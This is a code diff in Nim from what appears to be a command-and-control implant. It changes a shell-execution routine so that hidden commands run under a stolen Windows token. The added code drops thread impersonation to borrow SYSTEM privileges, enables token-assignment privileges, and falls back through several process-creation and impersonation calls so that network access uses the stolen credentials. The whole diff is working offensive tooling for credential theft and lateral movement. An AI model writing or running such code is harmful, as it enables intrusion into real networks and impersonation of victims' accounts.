@@ -143,6 +143,26 @@ proc runShell*(cmd: string): string =
         release(gTokenLock)
         t
       if activeTok != 0:
+        # Drop any thread impersonation (from make-token LOGON_NEW_CREDENTIALS)
+        # so the process primary token (SYSTEM) provides privileges for
+        # CreateProcess*W.  Restore after the child is started.
+        var hSavedImp: HANDLE = 0
+        block:
+          var hTh: HANDLE = 0
+          if OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, WINBOOL(1), addr hTh) != 0:
+            discard DuplicateTokenEx(hTh, TOKEN_ALL_ACCESS, nil,
+                                     securityImpersonation, tokenImpersonation, addr hSavedImp)
+            discard CloseHandle(hTh)
+            discard RevertToSelf()
+
+        # Prefer gStolenToken as the child's primary token so UNC network
+        # access uses make-token credentials instead of the machine account.
+        let childTok = block:
+          acquire(gTokenLock)
+          let st = gStolenToken
+          release(gTokenLock)
+          if st != 0 and st != activeTok: st else: activeTok
+
         # ── Privilege setup ───────────────────────────────────────────────────
         var hSelf: HANDLE
         if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
@@ -151,9 +171,9 @@ proc runShell*(cmd: string): string =
           discard enablePriv(hSelf, "SeIncreaseQuotaPrivilege")
           discard enablePriv(hSelf, "SeAssignPrimaryTokenPrivilege")
           discard CloseHandle(hSelf)
-        discard enablePriv(activeTok, "SeImpersonatePrivilege")
-        discard enablePriv(activeTok, "SeIncreaseQuotaPrivilege")
-        discard enablePriv(activeTok, "SeAssignPrimaryTokenPrivilege")
+        discard enablePriv(childTok, "SeImpersonatePrivilege")
+        discard enablePriv(childTok, "SeIncreaseQuotaPrivilege")
+        discard enablePriv(childTok, "SeAssignPrimaryTokenPrivilege")
 
         # Use the same stable token-launch path as the Go agent.  Redirecting
         # in the child avoids anonymous-pipe inheritance problems across
@@ -170,26 +190,29 @@ proc runShell*(cmd: string): string =
         let cwdW2 = newWideCString("C:\\Windows\\System32")
         var argsW2 = newWideCString(shellArgs)
         var argsAsUserW = newWideCString(shellArgs)
-        var procOk2 = CreateProcessWithTokenW(activeTok, 0, appW2, argsW2,
+        var procOk2 = CreateProcessWithTokenW(childTok, 0, appW2, argsW2,
           CREATE_NO_WINDOW, nil, cwdW2, addr si2, addr pi2)
         var withTokenErr: DWORD = if procOk2 != 0: 0 else: GetLastError()
         var asUserErr: DWORD = 0
         var impersonateErr: DWORD = 0
         if procOk2 == 0:
-          procOk2 = CreateProcessAsUserW(activeTok, appW2, argsAsUserW, nil, nil,
+          procOk2 = CreateProcessAsUserW(childTok, appW2, argsAsUserW, nil, nil,
             WINBOOL(0), CREATE_NO_WINDOW, nil, cwdW2, addr si2, addr pi2)
           if procOk2 == 0: asUserErr = GetLastError()
         if procOk2 == 0:
-          # Last fallback for tokens that cannot be used directly by either
-          # primary-token API: impersonate on this thread and retry.
-          if ImpersonateLoggedOnUser(activeTok) != 0:
+          # Last fallback: impersonate on this thread and retry.
+          if ImpersonateLoggedOnUser(childTok) != 0:
             var retryW = newWideCString(shellArgs)
-            procOk2 = CreateProcessWithTokenW(activeTok, 0, appW2, retryW,
+            procOk2 = CreateProcessWithTokenW(childTok, 0, appW2, retryW,
               CREATE_NO_WINDOW, nil, cwdW2, addr si2, addr pi2)
             if procOk2 == 0: withTokenErr = GetLastError()
             discard RevertToSelf()
           else:
             impersonateErr = GetLastError()
+        # Restore thread impersonation regardless of CreateProcess outcome
+        if hSavedImp != 0:
+          discard ImpersonateLoggedOnUser(hSavedImp)
+          discard CloseHandle(hSavedImp)
         if procOk2 == 0:
           return "[error: token shell launch; WithToken=" & $withTokenErr &
             "; AsUser=" & $asUserErr & "; Impersonate=" & $impersonateErr & "]"
